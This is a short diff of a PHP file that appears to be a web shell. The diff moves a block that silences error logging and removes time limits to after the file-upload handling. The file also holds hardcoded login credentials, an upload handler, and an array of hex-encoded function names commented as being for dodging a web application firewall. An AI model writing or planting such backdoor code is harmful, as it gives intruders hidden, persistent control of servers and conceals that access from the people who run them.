@@ -1,13 +1,5 @@
 <?php
-ob_start();
-session_start();
-@set_time_limit(0);
-@clearstatcache();
-@ini_set("error_log", null);
-@ini_set("log_errors", 0);
-@ini_set("max_execution_time", 0);
-@ini_set("output_buffering", 0);
-@ini_set("display_errors", 0);
+
 $user = "human";
 
 $pass = "password";
@@ -68,6 +60,14 @@ if (isset($_FILES["file"]["tmp_name"])) {
     }
 }
 
+@session_start();
+@set_time_limit(0);
+@clearstatcache();
+@ini_set("error_log", null);
+@ini_set("log_errors", 0);
+@ini_set("max_execution_time", 0);
+@ini_set("output_buffering", 0);
+@ini_set("display_errors", 0);
 // function WAF
 $Array = [
     "676574637764", # ge  tcw d => 0
